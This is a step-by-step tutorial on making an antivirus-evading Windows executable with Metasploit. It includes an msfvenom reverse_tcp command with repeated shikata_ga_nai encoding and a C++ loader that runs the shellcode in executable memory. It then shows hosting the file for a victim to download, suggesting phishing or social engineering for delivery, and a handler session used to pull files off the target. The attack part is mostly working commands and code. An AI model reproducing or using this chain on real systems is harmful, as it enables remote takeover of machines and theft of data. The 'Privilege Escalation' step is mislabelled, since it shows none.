# Evading Antivirus with Better Meterpreter Payloads

We'll create a .exe file with Metasploit, containing an exploit attempt, as well as a custom payload (code to execute).

## Tutorial Video

![Exe Attack](./images/exe_attack.png)

## Steps for creating payload to invade Antivirus

### Step 1: Creating the shellcode with MSFvenomm

```bash
msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 LHOST=192.168.1.26 LPORT=443 -e x86/shikata_ga_nai -i 15 -f c -o msf_attack.c
```

- `-p`: Payload which needs to be delivered in the exploit. We have used **windows/meterpreter/reverse_tcp** the payload is staged and will connect back to our handler to deliver the complete meterpreter payload.
- `--platform`: Platform for which exploit is developed. We have used **windows** as our platform.
- `-a`: Architecture of exploit is **x86** works with both 32 and 64-bit windows and better than **x64**.
- `LHOST`: Host to which exploit will connect. We are using our local IP here.
- `LPORT`: Port to which exploit will connect. We are using 443 to avoid windows firewall issue.
- `-e`: Encoder of exploit. We see the most success using **x86/shikata_ga_nai** with several iterations.
- `-i`: Iteration of the encoder. No of iteration for encoder **15** works fine
- `-f`: Output format of the exploit. we're using c as our format.
- `-o`: Output path of exploit.

### Step 2: Create a Visual Studio Project

Than on OS supporting visual studio because Linux doesn't support Visual Studio. We are using Visual Studio 2019 for this demonstration.

- Open Visual Studio and press **Create a new project**
- Select **Empty project**
- Choose a project name and press **Create**
- In **Source Files**, right-click to add a **New item**
- Select the CPP file and name this **main.cpp**

### Step 3: Create the Custom template

In your `main.cpp` file we will paste the following code:

```cpp
#include <stdio.h>
#include <windows.h>

unsigned const char payload[] = "";

size_t size = 0;

int main(int argc, char** argv) {

    char* code;

    printf("This is just a random string!\n");

    code = (char*)VirtualAlloc(NULL, size, MEM_COMMIT,PAGE_EXECUTE_READWRITE);

    memcpy(code, payload, size);

    ((void(*)())code)();

    return(0);
}
```

We just need to change two things:

1. Add the **Payload size** number (do not use the **Final size of c file**) from when we generated the payload.
2. Replace the placeholder in payload[] with the shellcode generated in buf[]
3. Add some random text so we don’t all use the same signatures!
4. In the build dropdown select release.
5. Copy file to home directory with name `msf_attack2.exe`

### Step 4: Serving executable with apache server

We'll use an HTTP server to host our file, so all the victim has to do is connect to us, download the file, and run it. In the real world, this could be accomplished in any number of ways, including social engineering or a phishing attack. For now, though, we will keep it simple. First, we'll copy executable to `/var/www/html` than we'll start our apache server.

```bash
$ cp msf_attack2.exe /var/www/html/msf_attack2.exe
$ service apache2 start
```

### Step 5: Starting a Meterpreter handler

On our attacking system, we'll now create a handler to accept incoming connections from our payload. We should ensure the IP and port are the same as used in previous steps:

```bash
$ service postgresql start
$ msfconsole
msf5 > use multi/handler
msf5 exploit(multi/handler)> set PAYLOAD windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler)> set LHOST 192.168.1.26
msf5 exploit(multi/handler)> set LPORT 443
msf5 exploit(multi/handler)> exploit -j
```

So we have the reverse TCP handler listening on port 443 for any incoming connections. Now we just need to get the files we generated earlier onto the Windows 7 machine.

### Step 6: Downloading file on a victim's computer

On the target, browse to the URL(`/msf_attack2.exe`) with the IP address of the attacking machine and download the file.

`http://192.168.1.26/msf_attack2.exe`

Then, simply save it and run it and we have a reverse connection to the Windows 7 machine from the Kali Linux command line.

### Step 7: Privilege Escalation

We have a Meterpreter session established back on our handler. So let’s see what we can do with full control.

```bash
msterpreter> help
```

Now we'll download the video file from the videos folder as proof.

```bash
msterpreter> cd ..
msterpreter> cd Videos
msterpreter> download ./Wildlife.wmv
```

The file will be downloaded to the home folder we can further play it.

### References

- `https://securityboulevard.com/2020/02/evading-antivirus-with-better-meterpreter-payloads/`
- `https://www.youtube.com/watch?v=STZ3aZDR2uc`